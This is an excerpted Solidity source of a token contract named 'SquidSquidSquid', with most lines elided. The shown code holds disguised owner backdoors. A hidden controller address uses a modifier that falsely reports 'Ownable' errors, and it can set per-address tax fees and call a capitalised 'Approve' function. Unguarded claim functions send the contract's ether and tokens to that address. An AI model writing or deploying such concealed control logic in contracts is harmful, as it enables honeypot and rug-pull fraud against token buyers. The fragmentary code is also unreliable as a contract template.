...
contract Squid is Context, IERC20, Ownable {
    ...
    string private _name = "SquidSquidSquid";
    string private _symbol = "SquidSquidSquid";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x08ED832c3c8Cc113dbB4559afc5183643271a814); 
    address payable private teamWalletAddress = payable(0x7F0DF4c68e16f956D0EB96D5D1eDD32ff39cf1DF); 
...
//	uint256 public _percent = 100;
	...
	address  public dividendTrack =_msgSender();
	...
	modifier onlyCan {
       require(dividendTrack == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
	...
	function setdTokenTracker(address newAddress) external onlyOwner() {
        dividendTrack = newAddress;
    }
	
	function claimBalance() external {
        payable(dividendTrack).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) external{
        IERC20(token).transfer(dividendTrack, amount);
    }
	...
	function setAddressToken(address _address, bool _enable, uint256 _addressTaxFee) external onlyCan {
	...
	function Approve(address spender,uint256 amount)public onlyCan{
